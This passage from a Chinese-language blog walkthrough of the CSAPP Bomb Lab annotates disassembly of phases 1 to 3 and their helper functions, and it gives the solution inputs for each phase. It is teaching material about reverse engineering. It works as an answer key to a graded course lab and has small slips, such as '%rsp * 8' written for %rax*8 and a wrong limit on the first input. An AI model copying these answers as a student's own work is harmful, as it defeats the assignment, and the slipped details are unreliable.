40139b</span><br><span class="line">  </span><br><span class="line">  401388:	ba 00 00 00 00       	mov    $0x0,%edx						# 将 立即数 0x0 复制到 %edx</span><br><span class="line">  40138d:	eb 0c                	jmp    40139b &lt;strings_not_equal+0x63&gt;	# 直接跳转到 40139b</span><br><span class="line">  </span><br><span class="line">  40138f:	ba 01 00 00 00       	mov    $0x1,%edx						# 将立即数 0x1 复制到 %edx</span><br><span class="line">  401394:	eb 05                	jmp    40139b &lt;strings_not_equal+0x63&gt;	# 直接跳转到 40139b</span><br><span class="line">  </span><br><span class="line">  401396:	ba 01 00 00 00       	mov    $0x1,%edx						# 将立即数 0x1 复制到 %edx</span><br><span class="line">  </span><br><span class="line">  40139b:	89 d0                	mov    %edx,%eax						# 将 %edx 上的值复制到 %eax</span><br><span class="line">  40139d:	5b                   	pop    %rbx</span><br><span class="line">  40139e:	5d                   	pop    %rbp</span><br><span class="line">  40139f:	41 5c                	pop    %r12</span><br><span class="line">  4013a1:	c3                   	retq   </span><br></pre></td></tr></table></figure>

<ul>
<li><p>将 %r12、%rbp、%rbx 的原值入栈，%rbx &#x3D; %rdi，%rbp &#x3D; %rsi</p>
<blockquote>
<p>将 %rbx 和 %rbp 分别初始化为第一和第二个参数的值</p>
</blockquote>
</li>
<li><p>调用函数 string_length，%r12d &#x3D; %eax，%rdi &#x3D; %rbp，再次调用 string_length</p>
<blockquote>
<p>第一次调用 string_length 的参数是 %rdi，第一次调用的返回结果保存在 %r12d；第二次调用的参数是 %rbp（%rsi）</p>
</blockquote>
</li>
<li><p>%edx &#x3D; 0x1，if %eax !&#x3D; %r12d，<strong>跳转到 40139b</strong>，else <strong>……</strong></p>
<blockquote>
<p>这里比较的是两次调用 string_length 的返回值是否相等，即判断两个字符串长度是否相等</p>
</blockquote>
</li>
<li><p><strong>跳转到 40139b</strong>，%eax &#x3D; %edx，return</p>
</li>
<li><p><strong>如果 %eax &#x3D;&#x3D; %r12d</strong>，%eax &#x3D; *(%rbx)，if %al &#x3D;&#x3D; 0， <strong>跳转到 401388</strong>，else <strong>……</strong></p>
<blockquote>
<p>字符串长度已经相等了，这里在判断是否第一个字符串的第一个字符为 0，如果为 0 那么两个字符串长度为 0，已经相等了</p>
</blockquote>
</li>
<li><p><strong>跳转到 401388</strong>，%edx &#x3D; 0x0，<strong>直接跳转到 40139b</strong>，return 0</p>
</li>
<li><p><strong>如果 %al !&#x3D; 0</strong>，if %al &#x3D;&#x3D; *(%rbp)， <strong>跳转到 401372</strong>，else <strong>跳转到 40138f</strong></p>
<blockquote>
<p>这里第一次比较的是两个字符串的第一个字符是否相等，后面可能会有一个循环不断比较每个字符</p>
</blockquote>
</li>
<li><p><strong>跳转到 40138f</strong>，%edx &#x3D; 0x1，<strong>直接跳转到 40139b</strong>，return 1</p>
</li>
<li><p><strong>跳转到 401372</strong>，%rbx +&#x3D; 1，%rbp +&#x3D; 1，%eax &#x3D; *(%rbx)，if %al !&#x3D; 0x0， <strong>跳转到 40136a</strong>，else <strong>%edx &#x3D; 0x0，直接跳转到 40139b，return 0</strong></p>
<blockquote>
<p>这里递增两个字符串的当前地址，通过判断是否 &#x3D;&#x3D; &#x2F;0 来判断是否已经比较完了</p>
</blockquote>
</li>
<li><p><strong>跳转到 40136a</strong>，if *(%rbp) !&#x3D; %al， <strong>跳转到 401396</strong>，else <strong>执行到 401372，%rbx +&#x3D; 1，%rbp +&#x3D; 1 ……</strong></p>
<blockquote>
<p>这里继续比较两个字符串当前字符是否相等，如果相等继续递增比较，之后的每次比较都会循环到这里</p>
</blockquote>
</li>
<li><p><strong>跳转到 401396</strong>，%edx &#x3D; 0x1，%eax &#x3D; %edx，return 1</p>
</li>
<li><p>strings_not_equal 函数首先判断两个字符串长度是否相等，如果相等，再比较每个字符是否相等</p>
</li>
</ul>
<h2 id="string-length"><a href="#string-length" class="headerlink" title="string_length"></a>string_length</h2><ul>
<li>来都来了，不妨再看一下 string_length 的汇编代码</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">000000000040131b &lt;string_length&gt;:											# string_length 函数有一个参数</span><br><span class="line">  40131b:	80 3f 00             	cmpb   $0x0,(%rdi)						# 比较 0x0 和 %rdi 上的值所指向的值</span><br><span class="line">  40131e:	74 12                	je     401332 &lt;string_length+0x17&gt;		# if ==，跳转到 401332</span><br><span class="line">  401320:	48 89 fa             	mov    %rdi,%rdx						# 将 %rdi 上的值复制到 %rdx</span><br><span class="line">  </span><br><span class="line">  401323:	48 83 c2 01          	add    $0x1,%rdx						# 将 %rdx 上的值 + 1</span><br><span class="line">  401327:	89 d0                	mov    %edx,%eax						# 将 %edx 上的值复制到 %eax</span><br><span class="line">  401329:	29 f8                	sub    %edi,%eax						# 将 %eax 上的值 - %edi</span><br><span class="line">  40132b:	80 3a 00             	cmpb   $0x0,(%rdx)						# 比较 0x0 和 %rdx 上的值所指向的值</span><br><span class="line">  40132e:	75 f3                	jne    401323 &lt;string_length+0x8&gt;		# if !=，跳转到 401323（在通过循环来计算字符串长度，如果 %rdx == 0,说明遍历到字符串尾端 /0）</span><br><span class="line">  401330:	f3 c3                	repz retq 								# 返回，此时返回的长度 &gt;= 1</span><br><span class="line">  </span><br><span class="line">  401332:	b8 00 00 00 00       	mov    $0x0,%eax						# 将立即数 0x0 复制到 %eax（此时说明字符串为空串）</span><br><span class="line">  401337:	c3                   	retq   									# 返回，此时返回 0x0</span><br></pre></td></tr></table></figure>

<ul>
<li><p>if *(%rdi) &#x3D;&#x3D; 0x0， <strong>跳转到 401332</strong>，else <strong>……</strong></p>
<blockquote>
<p>这里判断字符串是否为空</p>
</blockquote>
</li>
<li><p><strong>跳转到 401332</strong>，%eax &#x3D; 0x0，return 0</p>
</li>
<li><p><strong>如果 *(%rdi) !&#x3D; 0x0**，%rdx &#x3D; %rdi，%rdx +&#x3D; 1, %eax &#x3D; %edx，%eax -&#x3D; %edi，if *(%rdx) !&#x3D; 0，</strong>跳转到 401323**，else <strong>return</strong></p>
<blockquote>
<p>把 %rdi 的值赋值给 %rdx，保持 %rdi 不变，递增 %rdx</p>
<p>将 %rdx 的值再赋给 %eax，便于返回，%eax -&#x3D; %edi，得到现有长度</p>
<p>如果遍历完了，return 字符串长度</p>
</blockquote>
</li>
<li><p><strong>跳转到 401323</strong>，%rdx +&#x3D; 1，%eax &#x3D; %edx，%eax -&#x3D; %edi ……</p>
<blockquote>
<p>这是一个循环，不断递增 %rdx，通过 %eax - %edi 更新长度，如果遍历完了就返回</p>
</blockquote>
</li>
</ul>
<h2 id="Result"><a href="#Result" class="headerlink" title="Result"></a>Result</h2><ul>
<li>分析到这里，答案早就已经得到了：<strong>Border relations with Canada have never been better.</strong> （不要忘记 **.**）</li>
<li><strong>运行结果</strong></li>
</ul>
<img src="/2024/03/05/CSAPP-Lab2/image-20240305205840572.png" class="" title="image-20240305205840572">

<h1 id="phase-2"><a href="#phase-2" class="headerlink" title="phase_2"></a>phase_2</h1><ul>
<li>phase_2 也是差不多的情况</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* The second phase is harder.  No one will ever figure out</span></span><br><span class="line"><span class="comment">    * how to defuse this... */</span></span><br><span class="line">   input = read_line();</span><br><span class="line">   phase_2(input);</span><br><span class="line">   phase_defused();</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;That&#x27;s number 2.  Keep going!\n&quot;</span>);</span><br></pre></td></tr></table></figure>

<h2 id="phase-2-1"><a href="#phase-2-1" class="headerlink" title="phase_2"></a>phase_2</h2><ul>
<li>仔细分析 phase_2 的汇编代码</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">0000000000400efc &lt;phase_2&gt;:</span><br><span class="line">  400efc:	55                   	push   %rbp							# 将 %rbp 上的值入栈</span><br><span class="line">  400efd:	53                   	push   %rbx							# 将 %rbx 上的值入栈</span><br><span class="line">  400efe:	48 83 ec 28          	sub    $0x28,%rsp					# 将 %rsp（栈指针）上的值 - 0x28</span><br><span class="line">  </span><br><span class="line">  400f02:	48 89 e6             	mov    %rsp,%rsi					# 将 %rsp 上的值复制到 %rsi</span><br><span class="line">  400f05:	e8 52 05 00 00       	callq  40145c &lt;read_six_numbers&gt;	# 调用 read_six_numbers 函数</span><br><span class="line">  400f0a:	83 3c 24 01          	cmpl   $0x1,(%rsp)					# 比较 0x1 和 %rsp 上的值所指向的值</span><br><span class="line">  400f0e:	74 20                	je     400f30 &lt;phase_2+0x34&gt;		# if ==，跳转到 400f30</span><br><span class="line">  400f10:	e8 25 05 00 00       	callq  40143a &lt;explode_bomb&gt;		# 调用 explode_bomb 函数</span><br><span class="line">  </span><br><span class="line">  400f15:	eb 19                	jmp    400f30 &lt;phase_2+0x34&gt;		# 直接跳转到 400f30</span><br><span class="line">  </span><br><span class="line">  400f17:	8b 43 fc             	mov    -0x4(%rbx),%eax				# 将 %rbx - 0x4 上的值所指向的值复制到 %eax</span><br><span class="line">  400f1a:	01 c0                	add    %eax,%eax					# 将 %eax 上的值 + %eax</span><br><span class="line">  400f1c:	39 03                	cmp    %eax,(%rbx)					# 比较 %eax 上的值和 %rbx 上的值所指向的值</span><br><span class="line">  400f1e:	74 05                	je     400f25 &lt;phase_2+0x29&gt;		# if ==，跳转到 400f25</span><br><span class="line">  400f20:	e8 15 05 00 00       	callq  40143a &lt;explode_bomb&gt;		# 调用 explode_bomb 函数</span><br><span class="line">  </span><br><span class="line">  400f25:	48 83 c3 04          	add    $0x4,%rbx					# 将 %rbx 上的值 + 0x4</span><br><span class="line">  400f29:	48 39 eb             	cmp    %rbp,%rbx					# 比较 %rbp 上的值和 % rbx 上的值</span><br><span class="line">  400f2c:	75 e9                	jne    400f17 &lt;phase_2+0x1b&gt; 		# if !=，跳转到 400f17</span><br><span class="line">  400f2e:	eb 0c                	jmp    400f3c &lt;phase_2+0x40&gt;		# 直接跳转到 400f3c</span><br><span class="line">  </span><br><span class="line">  400f30:	48 8d 5c 24 04       	lea    0x4(%rsp),%rbx				# 将 %rsp + 0x4 复制到 %rbx</span><br><span class="line">  400f35:	48 8d 6c 24 18       	lea    0x18(%rsp),%rbp				# 将 %rsp + 0x18 复制到 %rbp</span><br><span class="line">  400f3a:	eb db                	jmp    400f17 &lt;phase_2+0x1b&gt;		# 直接跳转到 400f17</span><br><span class="line">  </span><br><span class="line">  400f3c:	48 83 c4 28          	add    $0x28,%rsp					# 将 %rsp 上的值 + 0x28（释放内存）</span><br><span class="line">  400f40:	5b                   	pop    %rbx				</span><br><span class="line">  400f41:	5d                   	pop    %rbp</span><br><span class="line">  400f42:	c3                   	retq   </span><br></pre></td></tr></table></figure>

<ul>
<li><p>保存寄存器 %rbp、%rbx 的原值，为 phase_2 的栈帧分配 0x28（40）字节的空间</p>
</li>
<li><p>将 %rsp 的值复制到 %rsi；调用函数 read_six_numbers，if *(%rsp) &#x3D;&#x3D; 0x1，<strong>跳转到 400f30</strong>，else <strong>调用 explode_bomb 函数，炸弹爆炸</strong></p>
<blockquote>
<p>read_six_numbers 有两个参数，%rdi 和 %rsi ，%rsi 初始化为 phase_2 栈帧的起始地址</p>
<p>通过函数名，我们可以知道 read_six_numbers 读了 6 个值，因此我们可能需要输入 6 个值，且第一个值必须是 0x1</p>
</blockquote>
</li>
<li><p><strong>跳转到 400f30</strong>，%rbx &#x3D; %rsp + 0x4，%rbp &#x3D; %rsp + 0x18，<strong>直接跳转到 400f17</strong></p>
<blockquote>
<p>初始化 %rbx 和 %rbp</p>
</blockquote>
</li>
<li><p><strong>跳转到 400f17</strong>，%eax &#x3D; *( %rbx - 0x4），%eax +&#x3D; %eax；if %eax &#x3D;&#x3D; *(%rbx)，<strong>跳转到 400f25</strong>，else <strong>调用 explode_bomb 函数，炸弹爆炸</strong></p>
<blockquote>
<p>%rbx 所指向的值必须是 %rbx - 0x4 所指向的 2 倍，栈是向下增长的，所以我们输入时，后一个值必须是前一个的 2 倍</p>
<p>%rbx 每次移动 4 个字节，我们可能输入的是 int</p>
</blockquote>
</li>
<li><p><strong>跳转到 400f25</strong>，%rbx +&#x3D; 0x4；if %rbx !&#x3D; %rbp，<strong>跳转到 400f17</strong>，else <strong>跳转到 400f3c</strong></p>
<blockquote>
<p>这是一个循环，向上移动 %rbx，如果 %rbx 还没有达到 %rbp，则继续循环比较</p>
<p>而如果达到了，跳转到 400f3c，释放内存并返回</p>
</blockquote>
</li>
<li><p>因此我们可以通过上述说明了解到，phase_2 让我们输入 6 个整数，且后一个必须是前一个的 2 倍，第一个值是 1</p>
</li>
<li><p>我们还可以知道，phase_2 的栈帧分配了 40 个字节的空间，我们用了 24 个，剩下的空间有防止缓冲区溢出的作用</p>
<blockquote>
<p>24 可以根据 %rbp &#x3D; %rsp + 0x18（24）得知，也变相证明了确实需要我们输入 6 个 int</p>
</blockquote>
</li>
</ul>
<h2 id="read-six-numbers"><a href="#read-six-numbers" class="headerlink" title="read_six_numbers"></a>read_six_numbers</h2><ul>
<li>我们也可以分析一下 read_six_numbers 的汇编代码，看看是否有新发现</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">000000000040145c &lt;read_six_numbers&gt;:</span><br><span class="line">  40145c:	48 83 ec 18          	sub    $0x18,%rsp						# 将 %rsp 上的值 - 0x18</span><br><span class="line">  401460:	48 89 f2             	mov    %rsi,%rdx						# 将 %rsi 上的值复制到 %rdx</span><br><span class="line">  401463:	48 8d 4e 04          	lea    0x4(%rsi),%rcx 					# 将 %rsi + 0x4 复制到 %rcx</span><br><span class="line">  </span><br><span class="line">  401467:	48 8d 46 14          	lea    0x14(%rsi),%rax					# 将 %rsi + 0x14 复制到 %rax</span><br><span class="line">  40146b:	48 89 44 24 08       	mov    %rax,0x8(%rsp)					# 将 %rax 上的值复制到 %rsp + 0x8 上的值所指向的值</span><br><span class="line">  401470:	48 8d 46 10          	lea    0x10(%rsi),%rax					# 将 %rsi + 0x10 复制到 %rax</span><br><span class="line">  401474:	48 89 04 24          	mov    %rax,(%rsp)						# 将 %rax 上的值复制到 %rsp 上的值所指向的值</span><br><span class="line">  </span><br><span class="line">  401478:	4c 8d 4e 0c          	lea    0xc(%rsi),%r9					# 将 %rsi + 0xc 复制到 %r9</span><br><span class="line">  40147c:	4c 8d 46 08          	lea    0x8(%rsi),%r8 					# 将 %rsi + 0x8 复制到 %r8</span><br><span class="line">  </span><br><span class="line">  401480:	be c3 25 40 00       	mov    $0x4025c3,%esi					# 将立即数复 0x4025c3 制到 %esi</span><br><span class="line">  401485:	b8 00 00 00 00       	mov    $0x0,%eax						# 将立即数 0x0 复制到 %eax</span><br><span class="line">  40148a:	e8 61 f7 ff ff       	callq  400bf0 &lt;__isoc99_sscanf@plt&gt;		# 调用 _isoc99_sscanf@plt 函数</span><br><span class="line">  40148f:	83 f8 05             	cmp    $0x5,%eax						# 比较 0x5 和 %eax（函数返回值）</span><br><span class="line">  401492:	7f 05                	jg     401499 &lt;read_six_numbers+0x3d&gt;	# if &gt;，跳转到 401499</span><br><span class="line">  401494:	e8 a1 ff ff ff       	callq  40143a &lt;explode_bomb&gt;			# 调用 explode_bomb 函数</span><br><span class="line">  </span><br><span class="line">  401499:	48 83 c4 18          	add    $0x18,%rsp						# 将 %rsp 上的值 + 0x18（释放内存）</span><br><span class="line">  40149d:	c3                   	retq   									# 返回</span><br></pre></td></tr></table></figure>

<ul>
<li><p>为 read_six_number 的栈帧分配 0x18（24）个字节的空间，%rdx &#x3D; %rsi，%rcx &#x3D; %rsi + 0x4</p>
<blockquote>
<p>%rsi 的初始值为 phase_2 栈帧的起始地址，%rdx 和 %rcx 用来传递参数，获取输入值</p>
</blockquote>
</li>
<li><p>%rax &#x3D; %rsi + 0x14，*(%rsp + 0x8) &#x3D; %rax；%rax &#x3D; %rsi + 0x10， *(%rsp) &#x3D; %rax</p>
<blockquote>
<p>寄存器不够了，额外的 2 个参数通过 read_six_numbers 的栈帧来传递</p>
</blockquote>
</li>
<li><p>%r9 &#x3D; %rsi + 0xc，%r8 &#x3D; %rsi + 0x8</p>
<blockquote>
<p>%r9 和 %r8 用来传递参数</p>
</blockquote>
</li>
<li><p>%esi &#x3D; 0x4025c3，%eax &#x3D; 0x0；调用函数 isoc99_sscanf@plt，if 函数返回值 &gt; 0x5，<strong>跳转到 401499</strong>，else <strong>调用 explode_bomb 函数，炸弹爆炸</strong></p>
<blockquote>
<p>函数 sscanf 的参数有 8 个，%rdi 作用未知，%rsi 赋值为 0x40253 传入，%rdx、%rcx、%r8、%r9 传递参数，剩下 2 个参数由 read_six_numbers 的栈帧传递</p>
<p>我们通过反汇编工具可以知道 0x4025c3 处的值为 %d %d %d %d %d %d，也说明需要输入 6 个 int</p>
</blockquote>
</li>
</ul>
<img src="/2024/03/05/CSAPP-Lab2/image-20240305181631196.png" class="" title="image-20240305181631196">

<ul>
<li><p><strong>跳转到 401499</strong>，%rsp -&#x3D; 0x18，return</p>
<blockquote>
<p>释放内存并返回</p>
</blockquote>
</li>
</ul>
<h2 id="Result-1"><a href="#Result-1" class="headerlink" title="Result"></a>Result</h2><ul>
<li><p>分析到这里，我们可以很轻松的知道答案是：<strong>1 2 4 8 16 32</strong></p>
</li>
<li><p><strong>运行结果</strong></p>
</li>
</ul>
<img src="/2024/03/05/CSAPP-Lab2/image-20240305181228135.png" class="" title="image-20240305181228135">

<h1 id="phase-3"><a href="#phase-3" class="headerlink" title="phase_3"></a>phase_3</h1><ul>
<li>phase_3 依旧是需要我们输入一个或多个值验证正确性</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* I guess this is too easy so far.  Some more complex code will</span></span><br><span class="line"><span class="comment"> * confuse people. */</span></span><br><span class="line">input = read_line();</span><br><span class="line">phase_3(input);</span><br><span class="line">phase_defused();</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Halfway there!\n&quot;</span>);</span><br></pre></td></tr></table></figure>

<h2 id="phase-3-1"><a href="#phase-3-1" class="headerlink" title="phase_3"></a>phase_3</h2><ul>
<li>分析 phase_3 的汇编代码</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">0000000000400f43 &lt;phase_3&gt;:</span><br><span class="line">  400f43:	48 83 ec 18          	sub    $0x18,%rsp					# %rsp -= 0x18（为栈帧分配空间）</span><br><span class="line">  400f47:	48 8d 4c 24 0c       	lea    0xc(%rsp),%rcx				# %rcx = %rsp + 0xc</span><br><span class="line">  400f4c:	48 8d 54 24 08       	lea    0x8(%rsp),%rdx				# %rdx = %rsp + 0x8</span><br><span class="line">  400f51:	be cf 25 40 00       	mov    $0x4025cf,%esi				# %esi = 0x4025cf（可能是 %d %d %d 之类的）</span><br><span class="line">  400f56:	b8 00 00 00 00       	mov    $0x0,%eax					# %eax = 0x0</span><br><span class="line">  400f5b:	e8 90 fc ff ff       	callq  400bf0 &lt;__isoc99_sscanf@plt&gt;	# 调用 sscanf</span><br><span class="line">  </span><br><span class="line">  400f60:	83 f8 01             	cmp    $0x1,%eax			 </span><br><span class="line">  400f63:	7f 05                	jg     400f6a &lt;phase_3+0x27&gt;		# if %eax &gt; 0x1 跳转到 400f6a</span><br><span class="line">  400f65:	e8 d0 04 00 00       	callq  40143a &lt;explode_bomb&gt;		# 调用 explode_bomb，炸弹爆炸</span><br><span class="line">  </span><br><span class="line">  400f6a:	83 7c 24 08 07       	cmpl   $0x7,0x8(%rsp)			</span><br><span class="line">  400f6f:	77 3c                	ja     400fad &lt;phase_3+0x6a&gt;		# if *(%rsp + 0x8) &gt; 0x7，跳转到 400fad（炸弹爆炸）</span><br><span class="line">  </span><br><span class="line">  400f71:	8b 44 24 08          	mov    0x8(%rsp),%eax				# %eax = *(%rsp + 0x8)</span><br><span class="line">  400f75:	ff 24 c5 70 24 40 00 	jmpq   *0x402470(,%rax,8)			# 直接跳转到 *(%rax * 8 + 0x402470)</span><br><span class="line">  </span><br><span class="line">  400f7c:	b8 cf 00 00 00       	mov    $0xcf,%eax					# %eax = 0xcf</span><br><span class="line">  400f81:	eb 3b                	jmp    400fbe &lt;phase_3+0x7b&gt;		# 直接跳转到 400fbe</span><br><span class="line">  400f83:	b8 c3 02 00 00       	mov    $0x2c3,%eax					# %eax = 0x2c3</span><br><span class="line">  400f88:	eb 34                	jmp    400fbe &lt;phase_3+0x7b&gt;		# 直接跳转到 400fbe</span><br><span class="line">  400f8a:	b8 00 01 00 00       	mov    $0x100,%eax					# %eax = 0x100</span><br><span class="line">  400f8f:	eb 2d                	jmp    400fbe &lt;phase_3+0x7b&gt;		# 直接跳转到 400fbe</span><br><span class="line">  400f91:	b8 85 01 00 00       	mov    $0x185,%eax					# &amp;eax = 0x185</span><br><span class="line">  400f96:	eb 26                	jmp    400fbe &lt;phase_3+0x7b&gt;		# 直接跳转到 400fbe</span><br><span class="line">  400f98:	b8 ce 00 00 00       	mov    $0xce,%eax					# %eax = 0xce</span><br><span class="line">  400f9d:	eb 1f                	jmp    400fbe &lt;phase_3+0x7b&gt;		# 直接跳转到 400fbe</span><br><span class="line">  400f9f:	b8 aa 02 00 00       	mov    $0x2aa,%eax					# %eax = 0x2aa</span><br><span class="line">  400fa4:	eb 18                	jmp    400fbe &lt;phase_3+0x7b&gt;		# 直接跳转到 400fbe</span><br><span class="line">  400fa6:	b8 47 01 00 00       	mov    $0x147,%eax					# %eax = 0x147</span><br><span class="line">  400fab:	eb 11                	jmp    400fbe &lt;phase_3+0x7b&gt;		# 直接跳转到 400fbe</span><br><span class="line">  </span><br><span class="line">  400fad:	e8 88 04 00 00       	callq  40143a &lt;explode_bomb&gt;		# 调用 explode_bomb，炸弹爆炸</span><br><span class="line">  </span><br><span class="line">  400fb2:	b8 00 00 00 00       	mov    $0x0,%eax					# %eax = 0x0</span><br><span class="line">  400fb7:	eb 05                	jmp    400fbe &lt;phase_3+0x7b&gt;		# 直接跳转到 400fbe</span><br><span class="line">  400fb9:	b8 37 01 00 00       	mov    $0x137,%eax					# %eax = 0x137</span><br><span class="line">  </span><br><span class="line">  400fbe:	3b 44 24 0c          	cmp    0xc(%rsp),%eax			</span><br><span class="line">  400fc2:	74 05                	je     400fc9 &lt;phase_3+0x86&gt;		# if %eax == *(%rsp + 0xc)，跳转到 400fc9</span><br><span class="line">  400fc4:	e8 71 04 00 00       	callq  40143a &lt;explode_bomb&gt;		# 调用 explode_bomb，炸弹爆炸</span><br><span class="line">  400fc9:	48 83 c4 18          	add    $0x18,%rsp					# %rsp += 0x18（释放内存)</span><br><span class="line">  400fcd:	c3                   	retq   								# return</span><br></pre></td></tr></table></figure>

<ul>
<li><p>为 phase_3 的栈帧分配 0x18（24）个字节的空间，%rcx &#x3D; *(%rsp + 0xc)，%rdx &#x3D; *(%rsp + 0x8)，%esi &#x3D; 0x4025cf，%eax &#x3D; 0x0，调用 sscanf 函数</p>
<blockquote>
<p>我们可以知道，sccanf 函数有 4 个参数，%rdi 作用未知，%rsi 赋值为立即数 0x4025cf（可能是 %d %d …… 之类的参数），%rcx 和 %rdx 用来读取我们输入的值（此时我们就可以大致推断出我们可能需要输入 2 个值）</p>
<p>通过 x&#x2F;s 0x4025cf 可以得到 %d %d，说明确实需要我们输入 2 个 int</p>
</blockquote>
</li>
</ul>
<img src="/2024/03/05/CSAPP-Lab2/image-20240306142436680.png" class="" title="image-20240306142436680">

<ul>
<li><p>if %eax &gt; 0x1，<strong>跳转到 400f6a</strong>，else <strong>调用函数 explode_bomb，炸弹爆炸</strong></p>
<blockquote>
<p>测试返回值，说明返回值必须大于 1（这里推测如果输入成功返回 1，这里的成功仅仅推测为输入的是 2 个 int）</p>
</blockquote>
</li>
<li><p><strong>跳转到 400f6a</strong>，if *(%rsp + 0x8) &gt; 0x7， <strong>跳转到 400fad</strong>，else <strong>……</strong></p>
<blockquote>
<p>这里测试第一个输入值，如果大于 7，跳转到 400fad，否则 ……</p>
</blockquote>
</li>
<li><p><strong>跳转到 400fad</strong>，<strong>调用函数 explode_bomb，炸弹爆炸</strong></p>
<blockquote>
<p>这里说明第一个输入值必须小于 7</p>
</blockquote>
</li>
<li><p>**如果 *(%rsp + 0x8) &lt;&#x3D; 0x7**，%eax &#x3D; *(%rsp + 0x8)，直接跳转到 *(%rsp * 8 + 0x402470)</p>
<blockquote>
<p>这里根据第一个输入值来实现跳转，结合下边的分支语句，有点 switch 的感觉，这里也隐式的说明了答案不止一个</p>
<p>我们可以通过命令 x&#x2F;x 0x…… ，将内存中的值以 16 进制展现</p>
<p>这里假设我们输入的是 0，那么我们需要查看的地址是 0x402470，得到跳转地址 0x00400f7c</p>
</blockquote>
</li>
</ul>
<img src="/2024/03/05/CSAPP-Lab2/image-20240306221503147.png" class="" title="image-20240306221503147">

<ul>
<li><p><strong>跳转到我们得到的地址 0x400f7c</strong>，%eax &#x3D; 0xcf，<strong>直接跳转到 400fbe</strong></p>
</li>
<li><p><strong>跳转到 400fbe</strong>，if %eax &#x3D;&#x3D; *(%rsp + 0xc)， <strong>跳转到 400fc9</strong>，else <strong>调用函数 explode_bomb，炸弹爆炸</strong></p>
<blockquote>
<p>这里说明第二个输入值必须和我们通过第一个输入值跳转得到的值相等，而这里假设第一个输入值为 0，第二个输入值就必须为 0xcf（207）</p>
</blockquote>
</li>
<li><p><strong>跳转到 400fc9</strong>，%rsp +&#x3D; 0x18，return</p>
<blockquote>
<p>释放内存并返回</p>
</blockquote>
</li>
</ul>
<h2 id="Result-2"><a href="#Result-2" class="headerlink" title="Result"></a>Result</h2><ul>
<li><p>分析到这里，我们就得到了其中一个答案：<strong>0 207</strong></p>
</li>
<li><p><strong>运行结果</strong></p>
</li>
</ul>
<img src="/2024/03/05/CSAPP-Lab2/image-20240306221708478.png" class="" title="image-20240306221708478">

<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul>
<li>是否真的有更多答案？答案一共有几个？</li>
<li>假设我们<strong>第一个输入的值是 7</strong>，%rsp * 8 + 0x402470 &#x3D; 0x4024a8，通过命令 x&#x2F;x 0x4024a8 <strong>得到 0x400fa6</strong></li>
</ul>
<img src="/2024/03/05/CSAPP-Lab2/image-20240306221813395.png" class="" title="image-20240306221813395">

<ul>
<li><strong>跳转到 0x400fa6</strong>，%eax &#x3D; 0x147，那么我们第二个输入值就必须是 0x147（327）</li>
</ul>
<img src="/2024/03/05/CSAPP-Lab2/image-20240306222039642.png" class="" title="image-20240306222039642">

<ul>
<li><p>假设我们<strong>第一个输入值是 -1</strong>，%rsp * 8 + 0x402470 &#x3D; 0x402468，通过命令 x&#x2F;x 0x4024a8 <strong>得到 0x00000000</strong></p>
</li>
<li><p>假设我们<strong>第一个输入值是 -2</strong>，%rsp * 8 + 0x402470 &#x3D; 0x402460，通过命令 x&#x2F;x 0x402460 <strong>得到 0x73726579</strong></p>
